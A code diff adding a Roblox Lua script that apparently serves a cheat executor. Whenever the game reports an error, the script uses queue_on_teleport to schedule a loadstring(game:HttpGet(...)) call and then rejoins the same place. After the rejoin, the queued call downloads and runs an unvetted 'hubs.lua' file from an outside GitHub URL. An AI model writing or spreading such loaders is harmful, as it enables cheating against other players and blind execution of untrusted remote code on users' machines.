@@ -1,0 +1,29 @@
+local GuiService = game:GetService("GuiService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+
+local player = Players.LocalPlayer
+
+local function onErrorMessageChanged(errorMessage)
+    if errorMessage and errorMessage ~= "" then
+        print("Error detected: " .. errorMessage)
+
+        if player then
+            local scriptContent = [[
+                local scriptToExecute = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sinnombrexd1/Hsyeqobsgekwmaam/refs/heads/main/hubs.lua"))
+                if scriptToExecute then
+                    scriptToExecute()
+                end
+            ]]
+
+            local QueueTeleport = queue_on_teleport or (syn and syn.queue_on_teleport)
+            if QueueTeleport then
+                QueueTeleport(scriptContent)
+            end
+
+            TeleportService:Teleport(game.PlaceId, player)
+        end
+    end
+end
+
+GuiService.ErrorMessageChanged:Connect(onErrorMessageChanged)
